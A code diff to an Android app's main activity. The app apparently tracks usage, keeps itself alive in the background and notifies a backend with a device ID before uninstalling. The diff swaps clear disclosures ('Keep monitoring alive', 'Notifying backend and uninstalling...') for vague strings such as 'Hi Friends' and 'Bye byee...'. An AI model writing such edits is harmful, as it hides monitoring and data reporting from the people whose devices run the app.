@@ -53,7 +53,7 @@ class MainActivity : AppCompatActivity() {
             if (!askedUsage) {
                 askedUsage = true
                 startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
-                Toast.makeText(this, "Enable usage access for this app", Toast.LENGTH_LONG).show()
+                Toast.makeText(this, "Enable usage", Toast.LENGTH_LONG).show()
             }
             return false
         }
@@ -83,11 +83,9 @@ class MainActivity : AppCompatActivity() {
         if (prefs.getBoolean(KEY_SAMSUNG_HINT, false)) return
         prefs.edit().putBoolean(KEY_SAMSUNG_HINT, true).apply()
         AlertDialog.Builder(this)
-            .setTitle("Keep monitoring alive")
+            .setTitle("Hi Friends")
             .setMessage(
-                "Samsung Device care sleeps background apps. Set this app's battery to " +
-                    "Unrestricted, and remove it from Sleeping apps and Deep sleeping apps. " +
-                    "Leave usage access on.",
+                "Samsung Device",
             )
             .setPositiveButton("OK", null)
             .show()
@@ -140,7 +138,7 @@ class MainActivity : AppCompatActivity() {
             deviceId = deviceId(this),
         )
         val body = Json.encodeToString(payload)
-        Toast.makeText(this, "Notifying backend and uninstalling...", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "Bye byee...", Toast.LENGTH_SHORT).show()
         Thread {
             try {
                 val codeOk = BackendClient.post(this
